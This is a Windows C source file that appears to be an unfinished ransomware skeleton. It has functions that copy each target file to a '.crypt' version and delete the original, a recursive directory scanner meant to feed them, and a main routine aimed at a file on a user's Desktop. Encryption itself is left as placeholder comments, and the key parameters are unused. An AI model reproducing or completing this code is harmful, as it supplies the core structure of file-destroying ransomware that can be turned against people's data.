#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <strsafe.h>
BOOL EncryptFile(LPTSTR, LPVOID);
BOOL DecryptFile(LPTSTR, LPVOID);
DWORD ScanPath(LPTSTR);

// LPTSTR -> Pointer (TCHAR) String
// LPVOID -> void*
// LP -> Pointer
// C -> Constant
// T -> TCHAR
// STR -> String

int _tmain(int argc, _TCHAR* argv[]) {
    // DWORD attributes = GetFileAttributes(_T("C:\\Users\\Mata\\Desktop\\wget.txt"));
    EncryptFile(_T("C:\\Users\\Mata\\Desktop\\wget.txt"), NULL);
    return 0;
}

BOOL EncryptFile(LPTSTR lpFileName, LPVOID EncKey) {
    TCHAR szOutputFile[MAX_PATH]; // MAX_PATH was defined 260, (in minwindef.h)
    size_t length_of_arg;
    StringCchPrintf(szOutputFile, MAX_PATH - 1, _T("%s.crypt"), lpFileName);
    StringCchLength(szOutputFile, MAX_PATH, &length_of_arg);
    if(length_of_arg <= (MAX_PATH - 3)) {
        _tprintf(_T("Encoding %s \n"), lpFileName);
        // printf("%lu", GetFileAttributes(_T("C:\\Users\\Mata\\Desktop\\wget.txt")));
        if(CopyFile(lpFileName, szOutputFile, TRUE)) { // Encrypt function here
            if(DeleteFile(lpFileName)) {
                return TRUE;
            }
        }
    }
    return FALSE;
}

BOOL DecryptFile(LPTSTR lpFileName, LPVOID DecKey) {
    TCHAR szOutputFile[MAX_PATH]; // MAX_PATH was defined 260, (in minwindef.h)
    size_t length_of_arg;
    StringCchCopy(szOutputFile, MAX_PATH, lpFileName);
    TCHAR *ptr = _tcsrchr(szOutputFile, '.');
    if(ptr && !_tcsicmp(ptr, _T(".crypt"))) {
        *ptr = '\0';
        _tprintf(_T("Decoding %s\n"), szOutputFile);
    }
    if(CopyFile(lpFileName, szOutputFile, TRUE)) { // Encrypt function here
        if(DeleteFile(lpFileName)) {
            return TRUE;
        }
    }
    return FALSE;
}

DWORD ScanPath(LPTSTR lpPath) {
    WIN32_FIND_DATA ffd;
    TCHAR szDir[MAX_PATH];
    size_t length_of_arg;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    DWORD dwError = 0;
    DWORD dwCount = 0;
    DWORD dwFileAttrib = GetFileAttributes(lpPath);

    if(dwFileAttrib & FILE_ATTRIBUTE_DIRECTORY) {
        StringCchLength(lpPath, MAX_PATH, &length_of_arg);
        if(length_of_arg > MAX_PATH-3) {
            return 0;
        }
        StringCchCopy(szDir, MAX_PATH, lpPath);
        StringCchCat(szDir, MAX_PATH, _T("\\*"));
        if((hFind = FindFirstFile(szDir, &ffd)) == INVALID_HANDLE_VALUE) {
            dwError = GetLastError();
            return 0;
        }
        do {
            // _tprintf(_T("%s\n"), ffd.cFileName);
            // Usage of _tcscmp function is the same as strcmp but it is used to compare TCHAR.
            if(!_tcscmp(ffd.cFileName, _T(".")) || !_tcscmp(ffd.cFileName, _T(".."))) {
                continue;
            }
            TCHAR szFullPath[MAX_PATH];
            StringCchPrintf(szFullPath, MAX_PATH - 1, _T("%s\\%s"), lpPath, ffd.cFileName);
            StringCchLength(szFullPath, MAX_PATH, &length_of_arg);
            if(length_of_arg <= MAX_PATH-3) {
                dwCount += ScanPath(szFullPath);
            }

        }while(FindNextFile(hFind, &ffd) != 0);
        
        dwError = GetLastError();
        FindClose(hFind);
    }
    else {
        // Add encryption/decryption functions here.
        _tprintf(_T("%s\n"), lpPath);
        dwCount++;
    }
    return dwCount;
} 